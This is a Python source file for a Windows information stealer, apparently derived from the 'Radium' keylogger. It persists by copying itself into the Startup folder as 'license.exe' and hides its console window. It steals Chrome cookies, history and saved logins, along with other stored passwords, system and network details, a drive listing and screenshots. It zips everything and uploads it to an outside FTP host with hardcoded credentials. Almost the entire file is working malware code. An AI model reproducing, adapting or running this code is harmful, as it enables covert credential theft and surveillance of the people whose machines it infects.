

#Imported libraries
import os
import pyHook
import shutil
import signal
import getpass
import platform
import win32api
import pythoncom
import datetime
import subprocess
from ftplib import FTP
from PIL import ImageGrab
from os import getenv
from Recoveries import Test
import random


def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message
    print "Allcoted.."
    return result

doAllocate(2621440)
current_system_time = datetime.datetime.now()   #Get current system time

#In this keylogger a folder "Intel" is made in C:\Users\Public\
#The keystrokes are saved in Logs folder by the name of IntelRST.txt
#Screenshots are saved in a folder inside Logs
#10 Screenshots are sent at a time and are moved to "ToZipScreenshots" for zipping them and send as attachment
doAllocate(2621440)
path = "C:\Users\Public\Intel\Logs"
path_to_screenshot = "C:\Users\Public\Intel\Logs\Screenshots"   #Screenshots are saved in this folder
path_to_cookies = "C:\Users\Public\Intel\Logs"  #Cookies will be moved to this folder
dir_zip = "C:\Users\Public\Intel\Logs\ToZipScreenshots" #This folder will contain 10 screenshots and will zipped and sent as attachment
file_log = 'C:\Users\Public\Intel\Logs\IntelRST.txt'    #Contains keystrokes


currentdir = os.getcwd()    #Get current working directory
currentuser = getpass.getuser()  #Get current User

#Function to move all the files that are to be sent via email to one place

def copytostartup():
    try:
        #-----------------------
        originalfilename = "license.exe"  #This name should be equal to the name of exe/py that you create. Currently the name of this file is Radiumkeylogger.py
        #-----------------------
        #-----------------------
        coppiedfilename = 'license.exe'    #The file will be copied to startup folder by this name
        #-----------------------
        copytodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
        copyfromdir = currentdir + "\\" + originalfilename

        filesindir = os.listdir(copytodir)

        if coppiedfilename not in filesindir:
            try:
                shutil.copy2(copyfromdir, copytodir + coppiedfilename)
            except Exception as e:
                print e

    except Exception as e:
        print e

    return True


def MoveAttachments(f_name):
    arch_name = "C:\Users\Public\Intel\Logs\\" + f_name
    if f_name == 'Screenshots':
        files = os.listdir(arch_name)
        try:
            for i in range(10):
                try:
                    shutil.move(arch_name + "\\" + files[i], dir_zip)
                except Exception as e:
                    print e
        except Exception as e:
            print e
    else:
        try:
            shutil.move(arch_name, dir_zip)
        except Exception as e:
            print e

#Function to zip the files
def ZipAttachments(f_name):
    arch_name = "C:\Users\Public\Intel\Logs\\" + f_name
    files = os.listdir(dir_zip)

    try:
        shutil.make_archive(arch_name, 'zip', dir_zip)
    except Exception as e:
        pass

    for j in range(len(files)):
        try:
            os.remove(dir_zip + "\\" + files[j])
        except Exception as e:
            print e


try:
    ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
except:
    pass

try:
    os.makedirs(path)
    os.makedirs(dir_zip)
    os.makedirs(path_to_screenshot)
except OSError as exception:
	pass



def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None

    if include_stdout:
        ret = {'stdout:': subprocess.PIPE}
    else:
        ret = {}

    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret

#Function to get the Process ID
def getpid(process_name):
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

#Function to get the Public IP
def getpublicip():
    try:
        return urllib2.urlopen('http://ip.42.pl/raw').read()
    except:
        pass

#Function to get the System information
def getsysinfo():
    return platform.uname()

#Function to get the output of command ipconfig /all
def getipcnfg():
    try:
        ipcfg_file = 'C:\Users\Public\Intel\Logs\ipcfg.txt'
        f = open(ipcfg_file, "w")
        f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
        f.close()
    except Exception as e:
        print e

#Function to get save passwords from browsers, ftp clients and other programs
def getpasswords():
    passwords = Test.Result()
    return str(passwords.run())

#Function to combine all the slave information and save in the info.txt file
def getslaveinfo():
    slave_info = 'C:\Users\Public\Intel\Logs\info.txt'
    open_slave_info = open(slave_info, "w")
    try:
        open_slave_info.write(getpasswords() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(getpublicip() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(' '.join(str(s) for s in getsysinfo()) + '\n')
    except Exception as e:
        print e
    open_slave_info.close()

def DriveTree():
    file_dir1 = 'C:\Users\Public\Intel\Logs\Dir_View.txt'   #The drive hierarchy will be saved in this file
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    no_of_drives = len(drives)
    file_dir_O = open(file_dir1, "w")

    for d in range(no_of_drives):
        try:
            file_dir_O.write(str(drives[d]) + "\n")
            directories = os.walk(drives[d])
            next_dir = next(directories)

            next_directories = next_dir[1]
            next_files = next_dir[2]

            next_final_dir = next_directories + next_files

            for nd in next_final_dir:
                file_dir_O.write("	" + str(nd) + "\n")
                try:
                    sub_directories = os.walk(drives[d] + nd)

                    next_sub_dir = next(sub_directories)[1]
                    next_sub_sub_file = next(sub_directories)[2]

                    next_final_final_dir = next_sub_dir + next_sub_sub_file

                    for nsd in next_final_final_dir:
                        file_dir_O.write("		" + str(nsd) + "\n")

                        try:
                            sub_sub_directories = os.walk(drives[d] + nd + '\\' + nsd)

                            next_sub_sub_dir = next(sub_sub_directories)[1]
                            next_sub_sub_sub_file = next(sub_sub_directories)[2]

                            next_final_final_final_dir = next_sub_sub_dir + next_sub_sub_sub_file

                            for nssd in next_final_final_final_dir:
                                file_dir_O.write("			" + str(nssd) + "\n")
                        except Exception as e:
                            pass

                except Exception as e:
                    pass
        except Exception as e:
            pass

    file_dir_O.close()
    return True

#Fucntion to steal chrome cookies
def cookiestealer():
    cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default'

    cookiefile = 'Cookies'
    historyfile = 'History'
    LoginDatafile = "Login Data"

    copycookie = cookiepath + "\\" + cookiefile
    copyhistory = cookiepath + "\\" + historyfile
    copyLoginData = cookiepath + "\\" + LoginDatafile

    filesindir = os.listdir(path_to_cookies)

    if copycookie not in filesindir:
        try:
            shutil.copy2(copycookie, path_to_cookies)
        except:
            pass


    if copyhistory not in filesindir:
        try:
            shutil.copy2(copyhistory, path_to_cookies)
        except:
            pass


    if copyLoginData not in filesindir:
        try:
            shutil.copy2(copyLoginData, path_to_cookies)
        except:
            pass

    return True

#Function to take screenshot
def TakeScreenShot():
    ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    try:
        scrimg = ImageGrab.grab()
        scrimg.save(path_to_screenshot + '\\' + str(ts) + '.png')
    except Exception as e:
        print e
    return True

	
getipcnfg()
DriveTree()
getslaveinfo()

cookiestealer()
TakeScreenShot()


import ftplib
from os import getenv
import time


path = getenv("LOCALAPPDATA")#Specify your FTP Server address
path1= path.replace('\\','')	#Specify your FTP Server address
path2= path1.replace(':','')


def ftp(path2):

	try:
		
		SERVER="files.000webhost.com" #Specify your FTP Server address
		USERNAME="johnwalter" #Specify your FTP Username
		PASSWORD="12345678" #Specify your FTP Password
		SSL=0 #Set 1 for SSL and 0 for normal connection
		OUTPUT_DIR="/" #Specify output directory here
		if SSL==0:
			ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
		elif SSL==1:
			ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
		os.chdir("C:\\Users\\Public\\Intel\\Logs\\")	
		ft.cwd(OUTPUT_DIR)
		fp=open(path2+".zip",'rb')
		cmd= 'STOR' +' '+path2+".zip"
		ft.storbinary(cmd,fp)
		ft.quit()
		fp.close()
	except Exception as e:
		print e
	return True

import win32console, win32gui

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True





doAllocate(2621440)
print "Allocated"
copytostartup()
hide()
MoveAttachments('Dir_View.txt')
MoveAttachments('History')
MoveAttachments('Login Data')
MoveAttachments('Cookies')
MoveAttachments('info.txt')
MoveAttachments('ipcfg.txt')
MoveAttachments('screenshots')
ZipAttachments(path2)
ftp(path2)
